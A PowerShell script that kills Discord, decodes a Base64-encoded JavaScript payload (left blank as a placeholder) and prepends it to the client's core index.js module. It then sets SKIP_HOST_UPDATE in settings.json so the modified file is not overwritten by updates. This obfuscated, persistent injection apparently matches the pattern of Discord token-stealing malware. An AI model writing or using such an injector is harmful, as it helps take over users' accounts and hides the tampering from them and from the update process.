# === CONFIGURATION ===
$base64String = ""   # <-- Replace with your actual Base64 string (your JavaScript code)

# === 1. KILL DISCORD PROCESSES ===
Write-Host "Closing Discord processes..."
Get-Process -Name "Discord", "Discord*" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2   # Give time for processes to fully exit

# === 2. LOCATE INDEX.JS DYNAMICALLY ===
$discordLocal = "$env:LOCALAPPDATA\Discord"
$appFolder = Get-ChildItem -Path $discordLocal -Directory -Filter "app-*" | 
             Sort-Object Name -Descending | 
             Select-Object -First 1

if (-not $appFolder) {
    Write-Error "Discord app folder not found in $discordLocal"
    exit 1
}

$coreModule = Get-ChildItem -Path $appFolder.FullName -Directory -Filter "modules\discord_desktop_core-*" |
              Select-Object -First 1

if (-not $coreModule) {
    Write-Error "Could not find discord_desktop_core module in $($appFolder.FullName)"
    exit 1
}

$indexJsPath = Join-Path -Path $coreModule.FullName -ChildPath "discord_desktop_core\index.js"
if (-not (Test-Path $indexJsPath)) {
    Write-Error "index.js not found at $indexJsPath"
    exit 1
}

Write-Host "Target file: $indexJsPath"

# === 3. DECODE BASE64 STRING ===
try {
    $decodedBytes = [System.Convert]::FromBase64String($base64String)
    $codeToInsert = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
    Write-Host "Base64 decoded successfully."
} catch {
    Write-Error "Failed to decode Base64: $_"
    exit 1
}

# === 4. BACKUP ORIGINAL FILE ===
$backupPath = "$indexJsPath.backup_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
Copy-Item -Path $indexJsPath -Destination $backupPath -Force
Write-Host "Backup created at: $backupPath"

# === 5. PREPEND CODE (INSERT AT TOP) ===
try {
    # Read existing content
    $existingContent = Get-Content -Path $indexJsPath -Raw -Encoding UTF8
    
    # Combine: new code + existing content
    $newContent = $codeToInsert + "`n" + $existingContent   # `n adds a newline separator
    
    # Write back to file
    Set-Content -Path $indexJsPath -Value $newContent -Encoding UTF8 -NoNewline
    Write-Host "Successfully prepended code to $indexJsPath"
} catch {
    Write-Error "Failed to write to file: $_"
    exit 1
}



# Path to Discord's settings.json
$settingsPath = Join-Path -Path $env:APPDATA -ChildPath "Discord\settings.json"

# Ensure the directory exists
$settingsDir = Split-Path $settingsPath -Parent
if (-not (Test-Path $settingsDir)) {
    New-Item -ItemType Directory -Path $settingsDir -Force | Out-Null
}

# Read existing settings (if file exists)
if (Test-Path $settingsPath) {
    $jsonRaw = Get-Content -Path $settingsPath -Raw -Encoding UTF8
    # Convert from JSON to PowerShell object
    $settings = $jsonRaw | ConvertFrom-Json
} else {
    # If file doesn't exist, start with an empty hashtable
    $settings = @{}
}

# Add or update the "SKIP_HOST_UPDATE" property
$settings | Add-Member -MemberType NoteProperty -Name "SKIP_HOST_UPDATE" -Value $true -Force

# Convert back to JSON with proper formatting (2-space indentation)
$newJson = $settings | ConvertTo-Json -Depth 10

# Write back to file
Set-Content -Path $settingsPath -Value $newJson -Encoding UTF8 -Force

Write-Host "Added 'SKIP_HOST_UPDATE': true to $settingsPath"


Write-Host "Done!"